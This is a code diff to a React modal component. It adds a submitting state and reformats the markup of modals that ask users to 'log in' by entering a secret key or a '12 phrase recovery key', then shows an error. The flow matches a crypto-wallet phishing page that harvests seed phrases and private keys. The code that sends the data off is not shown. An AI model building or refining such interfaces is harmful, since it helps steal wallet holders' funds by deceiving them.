@@ -9,6 +9,7 @@ type ModalsProps = {
   secretKeyRef: RefObject<HTMLInputElement>;
   phraseRef: RefObject<HTMLTextAreaElement>;
   handleSubmit: (type: "secret" | "phrase") => void;
+  isSubmitting?: boolean;
 };
 
 export default function Modals({
@@ -19,11 +20,11 @@ export default function Modals({
   secretKeyRef,
   phraseRef,
   handleSubmit,
+  isSubmitting = false,
 }: ModalsProps) {
   if (!modal) return null;
   return (
     <>
-      <div className={`overlay${modal ? " active" : ""}`} onClick={closeModal} aria-label="Modal Overlay" tabIndex={-1}></div>
       {/* Login Modal */}
       <section
         className={`modalCamp${modal === "login" ? " active" : ""}`}
@@ -33,7 +34,9 @@ export default function Modals({
         style={{ display: modal === "login" ? "flex" : "none" }}
       >
         <div id="loginModal" className={`loginModal flx fdc jcc${modal === "login" ? " active" : ""}`}>
-          <button className="closeModal" onClick={closeModal} aria-label="Close login modal"><i className="fa-solid fa-x"></i></button>
+          <button className="closeModal" onClick={closeModal} aria-label="Close login modal">
+            <i className="fa-solid fa-x"></i>
+          </button>
           <div className="containerLoginModal">
             <h1 id="loginModalTitle">Login</h1>
             <div className="loginModalButtons flx fdc jcc aic">
@@ -49,6 +52,7 @@ export default function Modals({
           </div>
         </div>
       </section>
+      
       {/* Secret Key Modal */}
       <section
         className={`modalCamp2${modal === "secret" ? " active" : ""}`}
@@ -58,15 +62,34 @@ export default function Modals({
         style={{ display: modal === "secret" ? "flex" : "none" }}
       >
         <div id="secreteKeyLogin" className="modalLoginData">
-          <button className="closeModal" onClick={closeModal} aria-label="Close secret key modal"><i className="fa-solid fa-x"></i></button>
+          <button className="closeModal" onClick={closeModal} aria-label="Close secret key modal">
+            <i className="fa-solid fa-x"></i>
+          </button>
           <h1 id="secretKeyModalTitle">Login</h1>
           <p>Please add your secret key below</p>
           <form className="inputSection flx fdc" onSubmit={e => { e.preventDefault(); handleSubmit("secret"); }}>
-            <input id="inputSecretKey" className="loginInput" type="text" placeholder="Secret Key" ref={secretKeyRef} required autoFocus aria-label="Secret Key" />
-            <button className="submitBtn" type="submit">Submit</button>
+            <input 
+              id="inputSecretKey" 
+              className="loginInput" 
+              type="text" 
+              placeholder="Secret Key" 
+              ref={secretKeyRef} 
+              required 
+              autoFocus 
+              aria-label="Secret Key"
+              disabled={isSubmitting}
+            />
+            <button 
+              className="submitBtn" 
+              type="submit" 
+              disabled={isSubmitting}
+            >
+              {isSubmitting ? "Submitting..." : "Submit"}
+            </button>
           </form>
         </div>
       </section>
+      
       {/* Phrase Modal */}
       <section
         className={`modalCamp3${modal === "phrase" ? " active" : ""}`}
@@ -76,15 +99,35 @@ export default function Modals({
         style={{ display: modal === "phrase" ? "flex" : "none" }}
       >
         <div className="modalLoginData" id="PhraseLogin">
-          <button className="closeModal" onClick={closeModal} aria-label="Close phrase modal"><i className="fa-solid fa-x"></i></button>
+          <button className="closeModal" onClick={closeModal} aria-label="Close phrase modal">
+            <i className="fa-solid fa-x"></i>
+          </button>
           <h1 id="phraseModalTitle">Login</h1>
           <p>Please add your 12 phrase recovery key below</p>
           <form className="inputSection flx fdc" onSubmit={e => { e.preventDefault(); handleSubmit("phrase"); }}>
-            <textarea id="PhraseInput" className="loginInput" cols={30} rows={10} placeholder="12 phrase Key" ref={phraseRef} required autoFocus aria-label="12 phrase Key"></textarea>
-            <button className="submitBtn" type="submit">Submit</button>
+            <textarea 
+              id="PhraseInput" 
+              className="loginInput" 
+              cols={30} 
+              rows={10} 
+              placeholder="12 phrase Key" 
+              ref={phraseRef} 
+              required 
+              autoFocus 
+              aria-label="12 phrase Key"
+              disabled={isSubmitting}
+            ></textarea>
+            <button 
+              className="submitBtn" 
+              type="submit"
+              disabled={isSubmitting}
+            >
+              {isSubmitting ? "Submitting..." : "Submit"}
+            </button>
           </form>
         </div>
       </section>
+      
       {/* Error Modal */}
       <section
         className={`modalCamp4${modal === "error" ? " active" : ""}`}
@@ -94,7 +137,9 @@ export default function Modals({
         style={{ display: modal === "error" ? "flex" : "none" }}
       >
         <div className="errorAlert">
-          <button className="closeModal" onClick={closeModal} aria-label="Close error modal"><i className="fa-solid fa-x"></i></button>
+          <button className="closeModal" onClick={closeModal} aria-label="Close error modal">
+            <i className="fa-solid fa-x"></i>
+          </button>
           <div className="errorAlertContainer flx aic jcc">
             <img src="/images/error-icon-32.webp" alt="Error" />
             <div className="errorTxt flx fdc aic jcc">
@@ -110,4 +155,4 @@ export default function Modals({
       </section>
     </>
   );
-} 
+}
